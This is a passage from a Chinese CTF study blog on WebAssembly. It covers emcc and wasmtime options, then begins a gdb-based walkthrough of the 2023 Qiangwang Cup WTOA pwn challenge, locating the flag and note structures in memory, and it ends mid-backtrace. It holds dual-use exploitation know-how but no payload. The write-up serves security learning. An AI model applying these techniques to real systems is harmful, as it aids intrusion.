class="line"></span><br><span class="line">* &lt;name&gt; **.wasm** : WebAssembly without JavaScript support code</span><br><span class="line">  (&quot;standalone Wasm&quot;; this enables &quot;STANDALONE_WASM&quot;).</span><br></pre></td></tr></table></figure><p>   These rules only apply when linking.  When compiling to object code<br>   (See <em>-c</em> below) the name of the output file is irrelevant.</p></blockquote><p>即-o选项指定的<code>生成文件名的后缀</code>会影响编译结果的文件格式及数量</p><p>一般要<u>生成能够由wasm运行时直接运行的文件需要<code>.wasm</code>后缀格式</u>,即webassembly二进制格式</p><h4 id="s"><a href="#s" class="headerlink" title="-s"></a>-s</h4><p>指定编译时的一些设置变量</p><p>例如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-s WASM=1</span><br><span class="line">-s PURE_WASI=1#尽可能的使用WASI API</span><br><span class="line">-s STACK_OVERFLOW_CHECK=1</span><br></pre></td></tr></table></figure><p>还有许多变量参数,可以在 <code>$HOME/emsdk/upstream/emscripten/src/</code>目录下的<code>setting.js</code>文件中查看</p><h4 id="g"><a href="#g" class="headerlink" title="-g"></a>-g</h4><p>保留调试符号信息</p><blockquote><p>“-g<level>“<br>   [compile+link] Controls the level of debuggability. Each level<br>   builds on the previous one:</p><pre><code>  * &quot;-g0&quot;: Make no effort to keep code debuggable.  * &quot;-g1&quot;: When linking, preserve whitespace in JavaScript.  * &quot;-g2&quot;: When linking, preserve function names in compiled code.  * &quot;-g3&quot;: When compiling to object files, keep debug info,    including JS whitespace, function names, and LLVM debug info    (DWARF) if any (this is the same as -g).</code></pre></blockquote><h4 id="O"><a href="#O" class="headerlink" title="-O"></a>-O</h4><p>开启优化</p><h2 id="WASM运行时"><a href="#WASM运行时" class="headerlink" title="WASM运行时"></a>WASM运行时</h2><p>wasm运行时即用于加载、解释和执行 WebAssembly 模块的软件层,其可以模拟浏览器运行wasm的环境,在不启动浏览器的环境下操作wasm</p><p>WASM有四种主流的运行时,分别是</p><p><strong>wasmedge、wasmtime、wasmer、WAVM</strong> </p><p>ctf比赛中出现的比较多的是wasmtime,这里着重介绍它</p><h3 id="wasmtime"><a href="#wasmtime" class="headerlink" title="wasmtime"></a>wasmtime</h3><p>github仓库<a href="https://github.com/bytecodealliance/wasmtime">bytecodealliance/wasmtime: A fast and secure runtime for WebAssembly (github.com)</a></p><p>可以下载历史版本的wasmtime</p><p>主要命令如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Commands:</span><br><span class="line">  run       Runs a WebAssembly module</span><br><span class="line">  config    Controls Wasmtime configuration settings</span><br><span class="line">  compile   Compiles a WebAssembly module</span><br><span class="line">  explore   Explore the compilation of a WebAssembly module to native code</span><br><span class="line">  serve     Serves requests from a wasi-http proxy component</span><br><span class="line">  settings  Displays available Cranelift settings for a target</span><br><span class="line">  wast      Runs a WebAssembly test script file</span><br><span class="line">  help      Print this message or the help of the given subcommand(s)</span><br></pre></td></tr></table></figure><h4 id="run"><a href="#run" class="headerlink" title="run"></a>run</h4><p>运行wasm文件或者cwasm文件,不过大概率要求加—allow-precompiled选项</p><h4 id="compile"><a href="#compile" class="headerlink" title="compile"></a>compile</h4><p>将wasm文件编译为当前架构下的可执行文件格式(e.g. ELF)</p><p>后缀.cwasm(compiled wasm)</p><p>不过依然不能直接运行,还是要wasmtime执行</p><h4 id="更多选项-1"><a href="#更多选项-1" class="headerlink" title="更多选项"></a>更多选项</h4><h5 id="D"><a href="#D" class="headerlink" title="-D"></a>-D</h5><p>调试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-D, --debug &lt;KEY[=VAL[,..]]&gt;</span><br><span class="line">         Debug-related configuration options, `-D help` to see all</span><br></pre></td></tr></table></figure><h5 id="—env"><a href="#—env" class="headerlink" title="—env"></a>—env</h5><p>设置环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--env &lt;NAME[=VAL]&gt;</span><br><span class="line">          Pass an environment variable to the program.</span><br></pre></td></tr></table></figure><h5 id="—invoke"><a href="#—invoke" class="headerlink" title="—invoke"></a>—invoke</h5><p>单独执行某个函数,可以指定参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--invoke &lt;FUNCTION&gt;</span><br><span class="line">          The name of the function to run</span><br><span class="line"></span><br><span class="line">Invoking a specific function (e.g. `add`) in a WebAssembly module:</span><br><span class="line"></span><br><span class="line">wasmtime --invoke add example.wasm 1 2</span><br></pre></td></tr></table></figure><h5 id="—allow-precompiled"><a href="#—allow-precompiled" class="headerlink" title="—allow-precompiled"></a>—allow-precompiled</h5><p>允许提前编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--allow-precompiled</span><br><span class="line">          Allow executing precompiled WebAssembly modules as `*.cwasm` files.</span><br><span class="line">          </span><br><span class="line">          Note that this option is not safe to pass if the module being passed in is arbitrary user input. Only `wasmtime`-precompiled modules generated via the `wasmtime compile` command or equivalent should be passed as an argument with this option specified.</span><br></pre></td></tr></table></figure><h5 id="—disable-cache-deprecated"><a href="#—disable-cache-deprecated" class="headerlink" title="—disable-cache(deprecated)"></a>—disable-cache(deprecated)</h5><p>老版本选项,不使用缓存</p><h3 id="wabt"><a href="#wabt" class="headerlink" title="wabt"></a>wabt</h3><p>The WebAssembly Binary Toolkit</p><p>官方仓库<a href="https://github.com/WebAssembly/wabt">WebAssembly/wabt: The WebAssembly Binary Toolkit (github.com)</a></p><p>提供了一组wasm的工具包</p><p>主要如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">WABT (we pronounce it &quot;wabbit&quot;) is a suite of tools for WebAssembly, including:</span><br><span class="line"></span><br><span class="line">wat2wasm: translate from WebAssembly text format to the WebAssembly binary format</span><br><span class="line">wasm2wat: the inverse of wat2wasm, translate from the binary format back to the text format (also known as a .wat)</span><br><span class="line">wasm-objdump: print information about a wasm binary. Similiar to objdump.</span><br><span class="line">wasm-interp: decode and run a WebAssembly binary file using a stack-based interpreter</span><br><span class="line">wasm-decompile: decompile a wasm binary into readable C-like syntax.</span><br><span class="line">wat-desugar: parse .wat text form as supported by the spec interpreter (s-expressions, flat syntax, or mixed) and print &quot;canonical&quot; flat format</span><br><span class="line">wasm2c: convert a WebAssembly binary file to a C source and header</span><br><span class="line">wasm-strip: remove sections of a WebAssembly binary file</span><br><span class="line">wasm-validate: validate a file in the WebAssembly binary format</span><br><span class="line">wast2json: convert a file in the wasm spec test format to a JSON file and associated wasm binary files</span><br><span class="line">wasm-stats: output stats for a module</span><br><span class="line">spectest-interp: read a Spectest JSON file, and run its tests in the interpreter</span><br></pre></td></tr></table></figure><p>还有其他一些小工具</p><p>wat即Webassembly的文本格式</p><h3 id="WASI"><a href="#WASI" class="headerlink" title="WASI"></a>WASI</h3><p><a href="https://wasi.dev/">WASI </a></p><blockquote><p>WASI is a modular <strong>system interface for WebAssembly</strong>. As described in <a href="https://hacks.mozilla.org/2019/03/standardizing-wasi-a-webassembly-system-interface/">the initial announcement</a>, it’s focused on security and portability.</p></blockquote><p>WebAssembly是一种新的字节码格式，目前被应用于 web 中，由于其可移植、体积小，安全性的等优点被渐渐广泛认可，但是其主要是运行在浏览器中。</p><p>一些天才们想让 WebAssembly 也可以<strong>运行在非浏览器环境中</strong>，这就产生了 WASI。</p><p>wasi需要可移植的二进制文件（.wasm）和一个跨平台的 runtime，也就是说，我们在某一个平台上生成了.wasm，直接拿到其他平台上，也可以直接使用。</p><h1 id="WASM调试"><a href="#WASM调试" class="headerlink" title="WASM调试"></a>WASM调试</h1><p>wasm类题目调试是一大难点</p><p>特别是当提供的是经由wasmtime等运行时二次编译过的适应架构的文件,例如cwasm格式文件</p><h2 id="浏览器调试"><a href="#浏览器调试" class="headerlink" title="浏览器调试"></a>浏览器调试</h2><p>如果提供的文件是非由运行时二次编译的文件</p><p>那么可以使用chrome浏览器的开发者工具进行调试</p><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>如果提供的文件是由运行时二次编译的文件</p><p>由于几乎没有符号信息,且代码量较大,想要静态分析难度不低</p><p>那么就得使用gdb进行调试</p><p><code>gdb --args wasmtime --allow-precompiled  cwasm</code></p><p>不过这样显然是直接调试wasmtime程序,而不是我们希望的二进制文件</p><p>但是最终程序控制流肯定会转移给cwasm文件,而既然是题目那就肯定存在由用户控制的输入</p><p>所以我们可以直接运行直到自动断在有输入处,可以发现最终是直接运行cwasm映射在内存中的代码段</p><p>例如,这是2023强网杯WTOA的text段映射,整个text都被映射在这(elf中text段大小就是0xc000)</p><p><code>0x7ffff79fe000     0x7ffff7a0a000 r-xp     c000   1000 /home/aichch/pwn/WTOA/wtoa</code></p><p>段内偏移不变,但<strong>段与段之间的偏移是会变</strong>的</p><p>不过只要能够确定代码位置便足够了</p><p>之后触发各种函数,再由gdb回溯栈信息<u>得出各个重要函数的的位置</u>,并<u>回到ida中逆向分析</u></p><p>需要注意的是gdb分析给出的回溯栈信息并不完全准确</p><p>例如</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-01-01_142030.png" alt=""></p><p>这是最开始的回溯路径,但继续往下执行后它变成了</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-01-01_142230.png" alt=""></p><p>可见回溯栈少了一层,而且查看少的那层可以发现里面确实没有可执行代码</p><p>再往下,在即将再往下一层回溯时,栈又发生了变化</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-01-01_142601.png" alt=""></p><p>倒没有深入去研究这其中的原由,猜测可能是gdb栈回溯机制的原因</p><p>因为如此,对调试确定代码位置的难度又加大了一点,即不能直接一次性判断所有的栈回溯,而是要缓慢步进,根据正确的栈回溯信息作出判断</p><p>还有最后一点就是,就算确定了静态wasm的代码位置,真正进入静态分析就会发现内部依然是在嵌套调用其它函数,不过此时大可不必不停向下深入分析所有函数,只要能<u>根据经验</u>大致确认一两层便足够了</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="2023强网杯-WTOA"><a href="#2023强网杯-WTOA" class="headerlink" title="2023强网杯-WTOA"></a>2023强网杯-WTOA</h2><p>题目提供了两个文件</p><p><code>./launch.sh</code>是一个shell脚本,用于添加flag环境变量并执行程序</p><p><code>wtoa</code>乍一看是一个ELF文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file wtoa </span><br><span class="line">wtoa: ELF 64-bit LSB relocatable, x86-64, version 1, not stripped</span><br></pre></td></tr></table></figure><p>但是当使用ida加载时,会发现其完全不符合认知中的elf规范</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-01-18_225313.png" alt=""></p><p>根据其中的字符串信息(string file),可以知道这是一个经由11.0.1版本的wasmtime将wasm文件再编译而来的elf</p><p>图片中显示的各个节,在运行时都会映射到内存中使用</p><p>其中<code>.rodata.wasm</code>会被映射两次,一次是以只读模式映射,另一次是可读可写的映射(貌似是在wtoa的<u>模拟堆栈</u>中)</p><p>代码量较大且几乎没有调试符号,直接静态分析显然难度巨大</p><p>因此需要通过调试定位几个关键的函数</p><h3 id="调试定位"><a href="#调试定位" class="headerlink" title="调试定位"></a>调试定位</h3><p>gdb启动</p><p><code>gdb --args /home/aichch/wasm/Wasmtime/wasmtime-v11.0.1-x86_64-linux/wasmtime run --env FLAG=&quot;$FLAG&quot; --disable-cache --allow-precompiled ./wtoa</code></p><p>首先观察vmmap显示的调试信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">    0x555555400000     0x555556bce000 r-xp  17ce000      0 /home/aichch/wasm/Wasmtime/wasmtime-v11.0.1-x86_64-linux/wasmtime</span><br><span class="line">    0x555556dce000     0x555556f9e000 r--p   1d0000 17ce000 /home/aichch/wasm/Wasmtime/wasmtime-v11.0.1-x86_64-linux/wasmtime</span><br><span class="line">    0x555556f9e000     0x555556fa1000 rw-p     3000 199e000 /home/aichch/wasm/Wasmtime/wasmtime-v11.0.1-x86_64-linux/wasmtime</span><br><span class="line">    0x555556fa1000     0x555556fe5000 rw-p    44000      0 [heap]</span><br><span class="line">    0x7ffdf7bb1000     0x7ffe77bb1000 ---p 80000000      0 [anon_7ffdf7bb1]</span><br><span class="line">    0x7ffe77bb1000     0x7ffe77bb3000 rw-p     2000  1b000 /home/aichch/pwn/WTOA/wtoa</span><br><span class="line">    0x7ffe77bb3000     0x7ffe78bb1000 rw-p   ffe000      0 [anon_7ffe77bb3]</span><br><span class="line">    0x7ffe78bb1000     0x7ffff7bb2000 ---p 17f001000      0 [anon_7ffe78bb1]</span><br><span class="line">    0x7ffff7bb2000     0x7ffff7bf2000 rw-p    40000      0 [anon_7ffff7bb2]</span><br><span class="line">    0x7ffff7bf2000     0x7ffff7bf3000 r--p     1000      0 [anon_7ffff7bf2]</span><br><span class="line">    0x7ffff7bf3000     0x7ffff7bf4000 r-xp     1000      0 [anon_7ffff7bf3]</span><br><span class="line">    0x7ffff7bf4000     0x7ffff7bf6000 r--p     2000      0 [anon_7ffff7bf4]</span><br><span class="line">    0x7ffff7bf6000     0x7ffff7bf7000 r-xp     1000      0 [anon_7ffff7bf6]</span><br><span class="line">    0x7ffff7bf7000     0x7ffff7bf9000 r--p     2000      0 [anon_7ffff7bf7]</span><br><span class="line">    0x7ffff7bf9000     0x7ffff7bfa000 r-xp     1000      0 [anon_7ffff7bf9]</span><br><span class="line">    0x7ffff7bfa000     0x7ffff7bfc000 r--p     2000      0 [anon_7ffff7bfa]</span><br><span class="line">    0x7ffff7bfc000     0x7ffff7bfd000 r-xp     1000      0 [anon_7ffff7bfc]</span><br><span class="line">    0x7ffff7bfd000     0x7ffff7bfe000 r--p     1000      0 [anon_7ffff7bfd]</span><br><span class="line">    0x7ffff7bfe000     0x7ffff7bff000 r--p     1000      0 /home/aichch/pwn/WTOA/wtoa</span><br><span class="line">    0x7ffff7bff000     0x7ffff7c0b000 r-xp     c000   1000 /home/aichch/pwn/WTOA/wtoa</span><br><span class="line">    0x7ffff7c0b000     0x7ffff7c1f000 r--p    14000   d000 /home/aichch/pwn/WTOA/wtoa</span><br><span class="line">    0x7ffff7c1f000     0x7ffff7c24000 rw-p     5000      0 [anon_7ffff7c1f]</span><br><span class="line">    0x7ffff7c24000     0x7ffff7c46000 r--p    22000      0 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7c46000     0x7ffff7dbe000 r-xp   178000  22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7dbe000     0x7ffff7e0c000 r--p    4e000 19a000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7e0c000     0x7ffff7e10000 r--p     4000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7e10000     0x7ffff7e12000 rw-p     2000 1eb000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7e12000     0x7ffff7e16000 rw-p     4000      0 [anon_7ffff7e12]</span><br><span class="line">    0x7ffff7e16000     0x7ffff7e23000 r--p     d000      0 /usr/lib/x86_64-linux-gnu/libm-2.31.so</span><br><span class="line">    0x7ffff7e23000     0x7ffff7eca000 r-xp    a7000   d000 /usr/lib/x86_64-linux-gnu/libm-2.31.so</span><br><span class="line">    0x7ffff7eca000     0x7ffff7f63000 r--p    99000  b4000 /usr/lib/x86_64-linux-gnu/libm-2.31.so</span><br><span class="line">    0x7ffff7f63000     0x7ffff7f64000 r--p     1000 14c000 /usr/lib/x86_64-linux-gnu/libm-2.31.so</span><br><span class="line">    0x7ffff7f64000     0x7ffff7f65000 rw-p     1000 14d000 /usr/lib/x86_64-linux-gnu/libm-2.31.so</span><br><span class="line">    0x7ffff7f65000     0x7ffff7f6b000 r--p     6000      0 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">    0x7ffff7f6b000     0x7ffff7f7c000 r-xp    11000   6000 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">    0x7ffff7f7c000     0x7ffff7f82000 r--p     6000  17000 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">    0x7ffff7f82000     0x7ffff7f83000 r--p     1000  1c000 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">    0x7ffff7f83000     0x7ffff7f84000 rw-p     1000  1d000 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">    0x7ffff7f84000     0x7ffff7f88000 rw-p     4000      0 [anon_7ffff7f84]</span><br><span class="line">    0x7ffff7f88000     0x7ffff7f8a000 r--p     2000      0 /usr/lib/x86_64-linux-gnu/librt-2.31.so</span><br><span class="line">    0x7ffff7f8a000     0x7ffff7f8e000 r-xp     4000   2000 /usr/lib/x86_64-linux-gnu/librt-2.31.so</span><br><span class="line">    0x7ffff7f8e000     0x7ffff7f90000 r--p     2000   6000 /usr/lib/x86_64-linux-gnu/librt-2.31.so</span><br><span class="line">    0x7ffff7f90000     0x7ffff7f91000 r--p     1000   7000 /usr/lib/x86_64-linux-gnu/librt-2.31.so</span><br><span class="line">    0x7ffff7f91000     0x7ffff7f92000 rw-p     1000   8000 /usr/lib/x86_64-linux-gnu/librt-2.31.so</span><br><span class="line">    0x7ffff7f92000     0x7ffff7f95000 r--p     3000      0 /usr/lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">    0x7ffff7f95000     0x7ffff7fa7000 r-xp    12000   3000 /usr/lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">    0x7ffff7fa7000     0x7ffff7fab000 r--p     4000  15000 /usr/lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">    0x7ffff7fab000     0x7ffff7fac000 r--p     1000  18000 /usr/lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">    0x7ffff7fac000     0x7ffff7fad000 rw-p     1000  19000 /usr/lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">    0x7ffff7fad000     0x7ffff7fae000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/libdl-2.31.so</span><br><span class="line">    0x7ffff7fae000     0x7ffff7fb0000 r-xp     2000   1000 /usr/lib/x86_64-linux-gnu/libdl-2.31.so</span><br><span class="line">    0x7ffff7fb0000     0x7ffff7fb1000 r--p     1000   3000 /usr/lib/x86_64-linux-gnu/libdl-2.31.so</span><br><span class="line">    0x7ffff7fb1000     0x7ffff7fb2000 r--p     1000   3000 /usr/lib/x86_64-linux-gnu/libdl-2.31.so</span><br><span class="line">    0x7ffff7fb2000     0x7ffff7fb3000 rw-p     1000   4000 /usr/lib/x86_64-linux-gnu/libdl-2.31.so</span><br><span class="line">    0x7ffff7fb3000     0x7ffff7fb5000 rw-p     2000      0 [anon_7ffff7fb3]</span><br><span class="line">    0x7ffff7fb7000     0x7ffff7fb8000 r--p     1000      0 [anon_7ffff7fb7]</span><br><span class="line">    0x7ffff7fb8000     0x7ffff7fb9000 r-xp     1000      0 [anon_7ffff7fb8]</span><br><span class="line">    0x7ffff7fb9000     0x7ffff7fbb000 r--p     2000      0 [anon_7ffff7fb9]</span><br><span class="line">    0x7ffff7fbb000     0x7ffff7fbc000 r-xp     1000      0 [anon_7ffff7fbb]</span><br><span class="line">    0x7ffff7fbc000     0x7ffff7fbe000 r--p     2000      0 [anon_7ffff7fbc]</span><br><span class="line">    0x7ffff7fbe000     0x7ffff7fbf000 r-xp     1000      0 [anon_7ffff7fbe]</span><br><span class="line">    0x7ffff7fbf000     0x7ffff7fc1000 r--p     2000      0 [anon_7ffff7fbf]</span><br><span class="line">    0x7ffff7fc1000     0x7ffff7fc2000 r-xp     1000      0 [anon_7ffff7fc1]</span><br><span class="line">    0x7ffff7fc2000     0x7ffff7fc4000 r--p     2000      0 [anon_7ffff7fc2]</span><br><span class="line">    0x7ffff7fc4000     0x7ffff7fc5000 r-xp     1000      0 [anon_7ffff7fc4]</span><br><span class="line">    0x7ffff7fc5000     0x7ffff7fc6000 r--p     1000      0 [anon_7ffff7fc5]</span><br><span class="line">    0x7ffff7fc6000     0x7ffff7fc7000 ---p     1000      0 [anon_7ffff7fc6]</span><br><span class="line">    0x7ffff7fc7000     0x7ffff7fc9000 rw-p     2000      0 [anon_7ffff7fc7]</span><br><span class="line">    0x7ffff7fc9000     0x7ffff7fcd000 r--p     4000      0 [vvar]</span><br><span class="line">    0x7ffff7fcd000     0x7ffff7fcf000 r-xp     2000      0 [vdso]</span><br><span class="line">    0x7ffff7fcf000     0x7ffff7fd0000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7fd0000     0x7ffff7ff3000 r-xp    23000   1000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ff3000     0x7ffff7ffb000 r--p     8000  24000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  2c000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  2d000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]</span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]</span><br></pre></td></tr></table></figure><p>可见wtoa程序被映射到了内存空间中</p><p>可执行代码是被映射到</p><p><code>0x7ffff7bff000     0x7ffff7c0b000 r-xp     c000   1000 /home/aichch/pwn/WTOA/wtoa</code></p><p>此外wtoa的模拟堆栈位于</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffe77bb1000     0x7ffe77bb3000 rw-p     2000  1b000 /home/aichch/pwn/WTOA/wtoa</span><br><span class="line">0x7ffe77bb3000     0x7ffe78bb1000 rw-p   ffe000      0 [anon_7ffe77bb3]</span><br></pre></td></tr></table></figure><p><strong>客户wasm程序的很多数据操作都是基于模拟堆栈,并且是直接使用<u>相对模拟堆栈的地址偏移</u></strong>,更多的会由运行时环境负责</p><h4 id="数据定位"><a href="#数据定位" class="headerlink" title="数据定位"></a>数据定位</h4><p>搜寻一下引入的flag的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search flag&#123;test&#125;</span><br><span class="line">Searching for value: &#x27;flag&#123;test&#125;&#x27;</span><br><span class="line">[heap]          0x555556fa7cd5 &#x27;flag&#123;test&#125;&#x27;</span><br><span class="line">[heap]          0x555556fc9190 &#x27;flag&#123;test&#125;&#x27;</span><br><span class="line">[anon_7ffe77bb3] 0x7ffe780b2b40 &#x27;flag&#123;test&#125;&#x27;</span><br><span class="line">[anon_7ffe77bb3] 0x7ffe780b2c6d &#x27;flag&#123;test&#125;&#x27;</span><br><span class="line">[stack]         0x7fffffffe22d &#x27;flag&#123;test&#125;&#x27;</span><br><span class="line">[stack]         0x7fffffffecb7 &#x27;flag&#123;test&#125;&#x27;</span><br></pre></td></tr></table></figure><p>找到了很多,但是位于wtoa堆栈的只有两个,偏移分别是<code>0x501b40</code>和<code>501c6d</code>,多次调试可以确定这个偏移是不变的</p><p>接下来就是让程序跑起来,可以看见是类似堆的菜单题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">ERROR:: No error information</span><br><span class="line">flag starts with: flag</span><br><span class="line">Note System</span><br><span class="line">[A]dd Note</span><br><span class="line">[E]dit Note</span><br><span class="line">[D]elete Note</span><br><span class="line">[S]how Note</span><br><span class="line">E[X]it</span><br><span class="line">Choice &gt; </span><br></pre></td></tr></table></figure><p>先创建一个Note并定位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search notenote</span><br><span class="line">Searching for value: &#x27;notenote&#x27;</span><br><span class="line">[anon_7ffe77bb3] 0x7ffe780b2cb8 &#x27;notenote&#x27;</span><br></pre></td></tr></table></figure><p>在模拟堆栈中的偏移是<code>0x501cb8</code></p><p>进一步搜寻<code>0x501cb8</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">02:0010│  0x7ffe780b2ca0 ◂— 0x501cb8</span><br><span class="line">03:0018│  0x7ffe780b2ca8 ◂— 0x8</span><br><span class="line">04:0020│  0x7ffe780b2cb0 ◂— 0x1300000000</span><br><span class="line">05:0028│  0x7ffe780b2cb8 ◂— &#x27;notenote&#x27;</span><br></pre></td></tr></table></figure><p>note在内存中的存储结构便大概是这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pointer</span><br><span class="line">size</span><br><span class="line">unknown</span><br><span class="line">content</span><br></pre></td></tr></table></figure><h4 id="函数定位"><a href="#函数定位" class="headerlink" title="函数定位"></a>函数定位</h4><p>正常在输入点断下时</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bt</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">0  0x00007ffff7d38607 <span class="keyword">in</span> 